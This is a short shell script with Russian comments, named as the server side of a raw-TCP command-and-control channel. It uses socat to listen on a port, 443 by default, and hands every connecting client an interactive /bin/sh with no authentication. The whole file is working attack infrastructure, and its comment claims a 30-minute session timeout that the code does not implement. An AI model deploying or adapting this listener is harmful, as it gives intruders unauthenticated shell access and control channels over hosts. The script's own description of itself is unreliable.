#!/bin/sh
# tcp_c2.sh — серверная часть raw-TCP канала (на нашем хосте).
# Каждая входящая сессия = отдельный sh, лимит детей, таймаут 30 мин.
# Запуск: sh tcp_c2.sh <port> [max_children]
PORT="${1:-443}"
MAX="${2:-32}"
command -v socat >/dev/null 2>&1 || { echo "нужен socat"; exit 1; }
exec socat "TCP-LISTEN:$PORT,reuseaddr,fork,max-children=$MAX" \
  'EXEC:/bin/sh,pty,stderr,setsid,sigint,sane'
